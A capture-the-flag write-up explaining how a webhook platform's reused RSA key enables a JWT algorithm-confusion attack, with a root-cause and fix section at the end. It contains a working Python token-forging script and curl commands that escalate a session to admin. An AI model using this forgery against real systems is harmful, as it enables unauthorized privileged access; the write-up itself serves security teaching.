# Hookery — Writeup

**Category:** Web
**Difficulty:** Easy
**Points:** 50 XP

## Briefing

> A small team shipping a webhook platform that a lot of other products quietly depend on. They were proud of one decision in particular. Rather than juggle two sets of keys, they reused the key that signs your webhooks to also sign the dashboard logins. One key, one less thing to manage. Nobody went back to check what that key could now be used for.

The briefing telegraphs the vulnerability directly: **the same RSA key pair signs both outbound webhook payloads and dashboard session JWTs.** That's a strong hint toward a JWT **algorithm confusion** attack.

## Recon

Hookery is a webhook-delivery SaaS. The app exposes:

- `/register`, `/login` — account creation and session auth
- `/app` — customer console (endpoints, delivery logs)
- `/app/platform` — a "Platform console" nav item, visible in the sidebar to every logged-in user
- `/.well-known/webhook-key.pem` — the **public** key customers use to verify webhook signatures

That last one is the key detail. Publishing an RSA public key for webhook signature verification is completely normal — but it becomes dangerous if a server ever treats a raw secret input as valid regardless of whether it's meant to be an HMAC secret or an asymmetric public key.

## Step 1 — Get an authenticated session

Registered a throwaway account and logged in to capture the session cookie:

```bash
TARGET="https://<challenge-host>"

curl -s -c cookies.txt -X POST $TARGET/register \
  -d "name=Test User&company=TestCo&email=test@test.com&password=Passw0rd1" \
  -H "Content-Type: application/x-www-form-urlencoded"

curl -s -c cookies.txt -X POST $TARGET/login \
  -d "email=test@test.com&password=Passw0rd1" \
  -H "Content-Type: application/x-www-form-urlencoded" -i
```

The `Set-Cookie: hk_session=...` value is a JWT. Decoding it (without verifying):

```json
// header
{ "typ": "JWT", "alg": "RS256", "kid": "wh_2026a" }

// payload
{
  "sub": "test@test.com",
  "name": "Test User",
  "role": "customer",
  "company": "TestCo",
  "iat": 1783782230,
  "exp": 1783811030
}
```

`alg: RS256` confirms asymmetric signing, and `role: customer` is the authorization claim to target.

## Step 2 — Grab the reused public key

```bash
curl -s $TARGET/.well-known/webhook-key.pem -o hookery_pub.pem
```

This PEM is published so customers can verify inbound webhook signatures. According to the challenge premise, it's the **exact same keypair** used to sign session JWTs.

## Step 3 — Forge a token via RS256 → HS256 confusion

This is the classic JWT key-confusion bug: many JWT libraries verify an `RS256` token by calling `verify(token, key)`, where `key` is expected to be the RSA public key object. But if the *algorithm* used for verification is instead read from the attacker-controlled token header, an attacker can:

1. Set `alg: HS256` in the JWT header.
2. Sign the token as an **HMAC-SHA256** using the RSA **public key's raw bytes** as the HMAC secret.
3. The server calls `verify(token, rsa_public_key_bytes)` — and because it blindly does HMAC verification (since the token says `HS256`), it succeeds. The "public" key was never meant to be secret, so the forged signature validates.

PyJWT actually protects against this by refusing to use a PEM-formatted key as an HMAC secret (`InvalidKeyError: ... should not be used as an HMAC secret`), so the token had to be built manually:

```python
import hmac, hashlib, base64, json, time

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

with open('hookery_pub.pem', 'rb') as f:
    pubkey_bytes = f.read()  # raw PEM bytes, used as-is (no stripping)

header = {'typ': 'JWT', 'alg': 'HS256', 'kid': 'wh_2026a'}
payload = {
    'sub': 'test@test.com',
    'name': 'Test User',
    'role': 'admin',          # escalated claim
    'company': 'TestCo',
    'iat': int(time.time()),
    'exp': int(time.time()) + 3600
}

header_b64 = b64url(json.dumps(header, separators=(',', ':')).encode())
payload_b64 = b64url(json.dumps(payload, separators=(',', ':')).encode())
signing_input = f'{header_b64}.{payload_b64}'.encode()

sig = hmac.new(pubkey_bytes, signing_input, hashlib.sha256).digest()
token = f'{signing_input.decode()}.{b64url(sig)}'
print(token)
```

**Gotcha:** the HMAC secret has to match the exact bytes the server uses internally. Stripping the PEM's trailing newline broke verification (server redirected to `/login`); using the raw, unstripped file contents worked.

## Step 4 — Use the forged token

```bash
FORGED=$(cat forged_token.txt)
curl -s -b "hk_session=$FORGED" $TARGET/app -i
# HTTP/2 200 — accepted, still shows customer-scoped view
```

The forged `role: admin` token was accepted (`200 OK` instead of a redirect to `/login`), confirming the signature bypass worked. The customer-facing `/app` view doesn't visibly change based on role, but the sidebar links to a `/app/platform` route.

## Step 5 — Reach the privileged route

```bash
curl -s -b "hk_session=$FORGED" $TARGET/app/platform -i
```

This returned the **Platform console**, an internal admin panel gated by the `role` claim, containing:

```
Platform · master signing secret
Countersigns every tenant delivery at the edge. Held only here. Rotates on restart.

WEBVERSE{redacted}
```

## Flag

```
WEBVERSE{redacted}
```

## Root cause & fix

**Root cause:** Key reuse across trust boundaries combined with an unpinned JWT algorithm.

1. The same RSA keypair signed two categories of tokens with very different trust models: outbound webhook payloads (verified by third parties using a public key) and inbound session auth (meant to be verifiable only by the server itself).
2. The JWT verification logic trusted the `alg` field from the token header instead of pinning it server-side, allowing an attacker to switch from asymmetric (`RS256`) to symmetric (`HS256`) verification.
3. Because the "public" key was, by design, publicly available, using it as an HMAC secret let anyone with that PEM forge arbitrary, validly-signed session tokens — including elevated `role` claims.

**Fixes:**
- Never reuse a keypair across different token types/trust boundaries. Webhook verification keys and session signing keys should be entirely separate.
- Always pin the expected algorithm server-side when verifying JWTs (e.g., `jwt.decode(token, key, algorithms=["RS256"])`) rather than trusting the header.
- Treat any claim used for authorization (`role`, `is_admin`, etc.) as untrusted unless the signature has been verified against a known-good, non-public key using an explicit, expected algorithm.
